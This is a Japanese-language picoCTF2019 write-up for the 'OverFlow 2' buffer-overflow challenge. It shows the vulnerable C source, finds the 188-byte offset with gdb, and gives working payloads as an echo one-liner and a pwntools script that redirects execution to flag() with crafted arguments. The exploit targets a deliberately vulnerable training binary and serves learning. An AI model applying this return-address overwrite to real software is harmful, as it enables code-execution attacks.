# OverFlow 2
## picoCTF2019
## Binary Exploition
***

とりあえず与えられたソースコードを見てみる。  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

普通にBOFする問題ではあるが、ただBOFさせるだけではなく、二点注意する必要がある。  
* リターンアドレスをflag()にする
* 引数を入れてやらなければflagゲットまでいけない

まずはBOFさせるためオフセットを調べる。
> gdb ./vuln
> pattc 200
> patto PIEの値

これでoffsetがわかる。
> offset: 188

次にリターンアドレスとなるflag関数のアドレスを調べる。  
> p flag
これでリターンアドレスがわかる。
> リターンアドレス: 0x80485e6

ここまでを組み合わせると、188文字の適当な文字列+0x80485e6でflagを呼び出すことができる。  
次に引数を考える必要がある。引数ということは本来main関数の中に入っていたはずなので、その位置に0xDEADBEEFと0xC0DED00Dをflagの戻り値の後に入れる必要がある。この時flagの戻り値(本来vulnの戻り値であったところ)の分4バイト必要なため、flagのアドレスと引数の間に4バイト適当な文字を入れる必要がある。具体的には以下のようにする。  
188文字の適当な文字列+0x80485e6+AAAA+0xDEADBEEF+0xC0DED00D  
これをechoで渡せばいいので、以下のようなコマンドを打つ
> echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x85\x04\x08AAAA\xEF\xBE\xAD\xDE\x0D\xD0\xDE\xC0' | ./vuln

これでフラグがでるため、これをsubmitする。
と、これでもフラグはゲットできるが、やはりexploitを書いた方がかっこいいので、コードも書く。  
```
from pwn import *
context(arch="i386", os="linux")
p = process("./vuln")
binf = ELF("./vuln")
flag_point = binf.symbols[b'flag']
offset = 188
payload = "A"*offset + p32(flag_point) + p32(0x00000000) + p32(0xDEADBEEF) + p32(0xC0DED00D)
p.sendline(payload)
p.interactive()
```

context -> exploitの実行環境などの設定をいい感じにしてくれる。
ELF -> 実行ファイルの情報(checksecや関数のアドレスなど)を取得、表示する。
binf.symbols[b'flag'] -> binfの中に情報が入っていて、その中のflag関数のアドレスをバイナリデータにする。
p32(0x00000000) -> 中の0x00000000を32bitのリトルエンディアンに変えてくれる。

これを実行すると同じくフラグが出てくる。
